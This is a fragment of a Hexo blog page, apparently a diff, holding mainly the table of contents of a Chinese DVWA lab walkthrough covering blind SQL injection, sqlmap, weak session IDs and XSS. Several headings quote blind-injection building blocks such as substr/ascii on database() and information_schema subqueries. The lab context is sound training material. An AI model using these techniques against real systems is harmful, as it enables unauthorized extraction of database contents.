+          获取数据库名</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0%E9%95%BF%E5%BA%A6"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">
+          获取数据库名称长度</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">
+          获取数据库名称</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#substr-database-1-1-%E8%A1%A8%E7%A4%BA%E4%BB%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0%E4%B8%AD%E6%8F%90%E5%8F%96%E4%B8%80%E4%B8%AA%E5%AD%97%E7%AC%A6%EF%BC%8C1-1-%E8%A1%A8%E7%A4%BA%E6%8F%90%E5%8F%96%E4%BD%8D%E7%BD%AE%E4%B8%BA-1%E3%80%81%E9%95%BF%E5%BA%A6%E4%B8%BA-1"><span class="toc-number">1.1.3.2.1.</span> <span class="toc-text">
+          substr(database(),1,1) 表示从数据库名称中提取一个字符，1,1 表示提取位置为 1、长度为 1</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#ascii-substr-database-1-1-%E7%94%A8%E4%BA%8E%E6%8F%90%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%AD%97%E7%AC%A6%E5%B9%B6%E8%8E%B7%E5%8F%96%E5%85%B6-ASCII-%E5%80%BC"><span class="toc-number">1.1.3.2.2.</span> <span class="toc-text">
+          ascii(substr(database(),1,1)) 用于提取数据库名称的第一个字符并获取其 ASCII 值</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E5%90%8D-2"><span class="toc-number">1.1.4.</span> <span class="toc-text">
+          获取数据库表名</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E7%9A%84%E6%95%B0%E9%87%8F"><span class="toc-number">1.1.4.1.</span> <span class="toc-text">
+          获取表的数量</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#count-table-name-%E7%94%A8%E4%BA%8E%E7%BB%9F%E8%AE%A1%E6%BB%A1%E8%B6%B3%E7%89%B9%E5%AE%9A%E6%9D%A1%E4%BB%B6%E7%9A%84%E8%A1%8C%E6%95%B0%EF%BC%88%E8%BF%99%E9%87%8C%E5%8D%B3%E8%A1%A8%E7%9A%84%E6%95%B0%E9%87%8F%EF%BC%89"><span class="toc-number">1.1.4.1.1.</span> <span class="toc-text">
+          count(table_name) 用于统计满足特定条件的行数（这里即表的数量）</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%86%E5%88%AB%E8%8E%B7%E5%8F%96%E4%B8%A4%E4%B8%AA%E8%A1%A8%E7%9A%84%E8%A1%A8%E5%90%8D%E9%95%BF%E5%BA%A6"><span class="toc-number">1.1.4.2.</span> <span class="toc-text">
+          分别获取两个表的表名长度</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#select-table-name-from-information-schema-tables-where-table-schema-database-limit-0-1-%E7%94%A8%E4%BA%8E%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%A8%A1%E5%BC%8F%E4%B8%AD%E9%80%89%E6%8B%A9%E7%AC%AC%E4%B8%80%E4%B8%AA%E8%A1%A8%E5%90%8D"><span class="toc-number">1.1.4.2.1.</span> <span class="toc-text">
+          (select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1) 用于从信息模式中选择第一个表名</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#limit-0-1-%E7%94%A8%E4%BA%8E%E9%99%90%E5%88%B6%E5%8F%AA%E8%BF%94%E5%9B%9E%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%BB%93%E6%9E%9C%EF%BC%9Blimit-1-1%E7%94%A8%E4%BA%8E%E9%99%90%E5%88%B6%E5%8F%AA%E8%BF%94%E5%9B%9E%E7%AC%AC%E4%BA%8C%E4%B8%AA%E7%BB%93%E6%9E%9C%E2%80%A6"><span class="toc-number">1.1.4.2.2.</span> <span class="toc-text">
+          limit 0,1 用于限制只返回第一个结果；limit 1,1用于限制只返回第二个结果….</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%86%E5%88%AB%E8%8E%B7%E5%8F%96%E4%B8%A4%E4%B8%AA%E8%A1%A8%E7%9A%84%E8%A1%A8%E5%90%8D"><span class="toc-number">1.1.4.3.</span> <span class="toc-text">
+          分别获取两个表的表名</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="toc-number">1.1.5.</span> <span class="toc-text">
+          获取字段名</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96users%E8%A1%A8%E4%B8%AD%E5%AD%97%E6%AE%B5%E7%9A%84%E6%95%B0%E9%87%8F"><span class="toc-number">1.1.5.1.</span> <span class="toc-text">
+          获取users表中字段的数量</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%AF%8F%E4%B8%AA%E5%AD%97%E6%AE%B5%E7%9A%84%E5%AD%97%E6%AE%B5%E9%95%BF%E5%BA%A6"><span class="toc-number">1.1.5.2.</span> <span class="toc-text">
+          获取每个字段的字段长度</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E5%90%8D-1"><span class="toc-number">1.1.5.3.</span> <span class="toc-text">
+          获取字段名</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.2.</span> <span class="toc-text">
+          时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B-2"><span class="toc-number">1.2.1.</span> <span class="toc-text">
+          判断注入类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">
+          获取数据库名</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0%E9%95%BF%E5%BA%A6-1"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">
+          获取数据库名称长度</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#if-expr1-expr2-expr3-%E5%87%BD%E6%95%B0%EF%BC%9A%E5%A6%82%E6%9E%9C-expr1-%E6%98%AFTRUE-%EF%BC%8C%E5%88%99-if-%E7%9A%84%E8%BF%94%E5%9B%9E%E5%80%BC%E4%B8%BAexpr2-%EF%BC%8C%E5%90%A6%E5%88%99%E8%BF%94%E5%9B%9E%E5%80%BC%E5%88%99%E4%B8%BA-expr3%E3%80%82if-%E7%9A%84%E8%BF%94%E5%9B%9E%E5%80%BC%E4%B8%BA%E6%95%B0%E5%AD%97%E5%80%BC%E6%88%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%80%BC"><span class="toc-number">1.2.2.1.1.</span> <span class="toc-text">
+          if(expr1,expr2,expr3)函数：如果 expr1 是TRUE ，则 if()的返回值为expr2;，否则返回值则为 expr3。if() 的返回值为数字值或字符串值</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0-1"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">
+          获取数据库名称</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E5%90%8D-3"><span class="toc-number">1.2.3.</span> <span class="toc-text">
+          获取数据库表名</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E7%9A%84%E6%95%B0%E9%87%8F-1"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">
+          获取表的数量</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%86%E5%88%AB%E8%8E%B7%E5%8F%96%E4%B8%A4%E4%B8%AA%E8%A1%A8%E7%9A%84%E8%A1%A8%E5%90%8D%E9%95%BF%E5%BA%A6-1"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">
+          分别获取两个表的表名长度</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%86%E5%88%AB%E8%8E%B7%E5%8F%96%E4%B8%A4%E4%B8%AA%E8%A1%A8%E7%9A%84%E8%A1%A8%E5%90%8D-1"><span class="toc-number">1.2.3.3.</span> <span class="toc-text">
+          分别获取两个表的表名</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E5%90%8D-2"><span class="toc-number">1.2.4.</span> <span class="toc-text">
+          获取字段名</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96users%E8%A1%A8%E4%B8%AD%E5%AD%97%E6%AE%B5%E7%9A%84%E6%95%B0%E9%87%8F-1"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">
+          获取users表中字段的数量</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%AF%8F%E4%B8%AA%E5%AD%97%E6%AE%B5%E7%9A%84%E5%AD%97%E6%AE%B5%E9%95%BF%E5%BA%A6-1"><span class="toc-number">1.2.4.2.</span> <span class="toc-text">
+          获取每个字段的字段长度</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E5%90%8D-3"><span class="toc-number">1.2.4.3.</span> <span class="toc-text">
+          获取字段名</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sqlmap-1"><span class="toc-number">1.3.</span> <span class="toc-text">
+          Sqlmap</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-number">1.3.1.</span> <span class="toc-text">
+          获得当前数据库名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97%E8%A1%A8%E5%90%8D"><span class="toc-number">1.3.2.</span> <span class="toc-text">
+          获得表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97%E8%A1%A8%E7%9A%84%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="toc-number">1.3.3.</span> <span class="toc-text">
+          获得表的字段名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E5%85%B7%E4%BD%93%E6%95%B0%E6%8D%AE"><span class="toc-number">1.3.4.</span> <span class="toc-text">
+          获取字段具体数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Medium-7"><span class="toc-number">2.</span> <span class="toc-text">
+          Medium</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8-1"><span class="toc-number">2.1.</span> <span class="toc-text">
+          布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B-3"><span class="toc-number">2.1.1.</span> <span class="toc-text">
+          判断注入类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%88%97%E6%95%B0-3"><span class="toc-number">2.1.2.</span> <span class="toc-text">
+          查看列数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D-2"><span class="toc-number">2.1.3.</span> <span class="toc-text">
+          获取数据库名</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0%E9%95%BF%E5%BA%A6-2"><span class="toc-number">2.1.3.1.</span> <span class="toc-text">
+          获取数据库名称长度</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0-2"><span class="toc-number">2.1.3.2.</span> <span class="toc-text">
+          获取数据库名称</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E5%90%8D-4"><span class="toc-number">2.1.4.</span> <span class="toc-text">
+          获取数据库表名</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E7%9A%84%E6%95%B0%E9%87%8F-2"><span class="toc-number">2.1.4.1.</span> <span class="toc-text">
+          获取表的数量</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%86%E5%88%AB%E8%8E%B7%E5%8F%96%E4%B8%A4%E4%B8%AA%E8%A1%A8%E7%9A%84%E8%A1%A8%E5%90%8D%E9%95%BF%E5%BA%A6-2"><span class="toc-number">2.1.4.2.</span> <span class="toc-text">
+          分别获取两个表的表名长度</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%86%E5%88%AB%E8%8E%B7%E5%8F%96%E4%B8%A4%E4%B8%AA%E8%A1%A8%E7%9A%84%E8%A1%A8%E5%90%8D-2"><span class="toc-number">2.1.4.3.</span> <span class="toc-text">
+          分别获取两个表的表名</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E5%90%8D-4"><span class="toc-number">2.1.5.</span> <span class="toc-text">
+          获取字段名</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96users%E8%A1%A8%E4%B8%AD%E5%AD%97%E6%AE%B5%E7%9A%84%E6%95%B0%E9%87%8F-2"><span class="toc-number">2.1.5.1.</span> <span class="toc-text">
+          获取users表中字段的数量</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%AF%8F%E4%B8%AA%E5%AD%97%E6%AE%B5%E7%9A%84%E5%AD%97%E6%AE%B5%E9%95%BF%E5%BA%A6-2"><span class="toc-number">2.1.5.2.</span> <span class="toc-text">
+          获取每个字段的字段长度</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E5%90%8D-5"><span class="toc-number">2.1.5.3.</span> <span class="toc-text">
+          获取字段名</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8-1"><span class="toc-number">2.2.</span> <span class="toc-text">
+          时间盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#High-7"><span class="toc-number">3.</span> <span class="toc-text">
+          High</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Impossible-7"><span class="toc-number">4.</span> <span class="toc-text">
+          Impossible</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#SQL%E7%9B%B2%E6%B3%A8%EF%BC%9Ahttps-www-cnblogs-com-qiushuo-p-17485659-html"><span class="toc-number">4.0.0.0.1.</span> <span class="toc-text">
+          SQL盲注：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;qiushuo&#x2F;p&#x2F;17485659.html</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B9%9D%E3%80%81%E8%96%84%E5%BC%B1%E7%9A%84Session-ID"><span class="toc-number"></span> <span class="toc-text">
+          九、薄弱的Session ID</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Low-8"><span class="toc-number">1.</span> <span class="toc-text">
+          Low</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Medium-8"><span class="toc-number">2.</span> <span class="toc-text">
+          Medium</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#High-8"><span class="toc-number">3.</span> <span class="toc-text">
+          High</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Impossible-8"><span class="toc-number">4.</span> <span class="toc-text">
+          Impossible</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%81%E3%80%81XSS%EF%BC%88DOM%E5%9E%8B%EF%BC%89"><span class="toc-number"></span> <span class="toc-text">
+          十、XSS（DOM型）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Low-9"><span class="toc-number">1.</span> <span class="toc-text">
+          Low</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Medium-9"><span class="toc-number">2.</span> <span class="toc-text">
+          Medium</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#High-9"><span class="toc-number">3.</span> <span class="toc-text">
+          High</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8-amp-%E8%BF%9E%E6%8E%A5"><span class="toc-number">3.1.</span> <span class="toc-text">
+          用&amp;连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8"><span class="toc-number">3.2.</span> <span class="toc-text">
+          用#</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Impossible-9"><span class="toc-number">4.</span> <span class="toc-text">
+          Impossible</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%81%E4%B8%80%E3%80%81XSS%EF%BC%88%E5%8F%8D%E5%B0%84%E5%9E%8B%EF%BC%89"><span class="toc-number"></span> <span class="toc-text">
+          十一、XSS（反射型）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Low-10"><span class="toc-number">1.</span> <span class="toc-text">
+          Low</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Medium-10"><span class="toc-number">2.</span> <span class="toc-text">
+          Medium</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.svg" alt="avatar"></div><p class="sidebar-ov-author__text">hello world</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">6</div><div class="sidebar-ov-state-item__name">Archives</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>John Doe</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v6.0.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script></body></html>
